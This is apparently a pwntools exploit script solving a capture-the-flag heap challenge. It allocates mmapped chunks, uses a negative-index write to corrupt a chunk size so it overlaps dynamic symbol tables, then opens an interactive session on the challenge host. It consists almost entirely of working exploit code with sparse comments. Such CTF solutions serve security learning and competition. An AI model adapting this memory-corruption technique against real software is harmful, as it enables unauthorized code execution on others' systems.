#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chal')

host = args.HOST or 'amt.rs'
port = int(args.PORT or 31176)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *main+254
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# Create an mmaped chunk
chunk_size = 0x100000
io.sendlineafter(b'size: ',str(chunk_size))
io.sendafter(b'data: ',b'A'*chunk_size)

# Create an mmaped chunk
chunk_size = 0x100000
io.sendlineafter(b'size: ',str(chunk_size))
io.sendafter(b'data: ',b'A'*chunk_size)

"""
[Nr] Name              Type             Address           Offset     Size              EntSize          Flags  Link  Info  Align
[ 4] .gnu.hash         GNU_HASH         00000000000003c8  000003c8   0000000000004704  0000000000000000   A       5     0     8
[ 5] .dynsym           DYNSYM           0000000000004ad0  00004ad0   0000000000011b80  0000000000000018   A       6     1     8
"""
# Actual size 0x101000
# New size = actual + 0x16650 = 0x117650
io.sendlineafter(b'index: ',str(-(8-2)))
io.sendlineafter(b'new character: ',b'\x12')

# Create an mmaped chunk
chunk_size = 0x300000
io.sendlineafter(b'size: ',str(chunk_size))
io.sendafter(b'data: ',b'A'*chunk_size)

io.interactive()

